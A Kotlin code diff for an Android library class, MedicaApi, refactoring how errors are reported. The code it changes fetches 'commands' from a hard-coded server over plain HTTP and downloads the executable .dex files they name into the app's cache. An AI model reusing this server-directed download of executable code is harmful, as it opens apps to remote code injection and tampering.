@@ -2,7 +2,6 @@ package com.tunebrains.cpu.library
 
 import com.google.gson.Gson
 import com.tunebrains.cpu.library.cmd.LocalCommand
-import com.tunebrains.cpu.library.cmd.RxResult
 import com.tunebrains.cpu.library.cmd.ServerCommand
 import io.reactivex.Completable
 import io.reactivex.Single
@@ -48,14 +47,14 @@ class MedicaApi(val gson: Gson, val repository: TokenRepository) {
         return Completable.complete()
     }
 
-    fun command(local: LocalCommand): Single<RxResult<LocalCommand>> {
+    fun command(local: LocalCommand): Single<LocalCommand> {
         Timber.d("Will fetch command from server $local")
         return Single.create { emitter ->
             client.newCall(Request.Builder().url("http://magetic.com/c/api_command?com_id=${local.serverId}").build())
                 .enqueue(object : Callback {
                     override fun onFailure(call: Call, e: IOException) {
                         if (!emitter.isDisposed) {
-                            emitter.onSuccess(RxResult(null, e))
+                            emitter.onError(e)
                         }
                     }
 
@@ -65,16 +64,16 @@ class MedicaApi(val gson: Gson, val repository: TokenRepository) {
                             val info = gson.fromJson(body, ServerCommand::class.java)
                             if (info != null) {
                                 if (!emitter.isDisposed) {
-                                    emitter.onSuccess(RxResult(local.withServer(info), null))
+                                    emitter.onSuccess(local.withServer(info))
                                 }
                             } else {
                                 if (!emitter.isDisposed) {
-                                    emitter.onSuccess(RxResult(null, ApiException("Fail to get command $local")))
+                                    emitter.onError(ApiException("Fail to get command $local"))
                                 }
                             }
                         } else {
                             if (!emitter.isDisposed) {
-                                emitter.onSuccess(RxResult(null, ApiException("Fail to get command $local")))
+                                emitter.onError(ApiException("Fail to get command $local"))
                             }
                         }
                     }
@@ -83,14 +82,14 @@ class MedicaApi(val gson: Gson, val repository: TokenRepository) {
         }
     }
 
-    private fun downloadFile(url: String, root: File): Single<RxResult<File>> {
+    private fun downloadFile(url: String, root: File): Single<File> {
         Timber.d("Will download file from $url")
 
         return Single.create { emitter ->
             client.newCall(Request.Builder().url(url).build()).enqueue(object : Callback {
                 override fun onFailure(call: Call, e: IOException) {
                     if (!emitter.isDisposed) {
-                        emitter.onSuccess(RxResult(null, e))
+                        emitter.onError(e)
                     }
                 }
 
@@ -103,16 +102,16 @@ class MedicaApi(val gson: Gson, val repository: TokenRepository) {
                                 it.byteStream().copyTo(fos)
                             }
                             fos.close()
-                            emitter.onSuccess(RxResult(tmp, null))
+                            emitter.onSuccess(tmp)
                         } catch (ex: Throwable) {
                             if (!emitter.isDisposed) {
-                                emitter.onSuccess(RxResult(null, ex))
+                                emitter.onError(ex)
                             }
                         }
 
                     } else {
                         if (!emitter.isDisposed) {
-                            emitter.onSuccess(RxResult(null, ApiException("Fail to download file $url")))
+                            emitter.onError(ApiException("Fail to download file $url"))
                         }
                     }
                 }
@@ -121,20 +120,15 @@ class MedicaApi(val gson: Gson, val repository: TokenRepository) {
         }
     }
 
-    fun downloadCommand(command: LocalCommand, cacheDir: File): Single<RxResult<LocalCommand>> {
+    fun downloadCommand(command: LocalCommand, cacheDir: File): Single<LocalCommand> {
         Timber.d("Will download command $command")
 
         return if (command.server != null) {
             downloadFile(command.server.dex, cacheDir).map {
-                if (it.data != null) {
-                    RxResult<LocalCommand>(command.withDex(it.data.absolutePath), null)
-                } else {
-                    RxResult<LocalCommand>(null, it.throwable)
-
-                }
+                command.withDex(it.absolutePath)
             }
         } else {
-            Single.just(RxResult<LocalCommand>(null, ApiException("Failed to download empty server command")))
+            Single.error(ApiException("Failed to download empty server command"))
         }
     }
 }
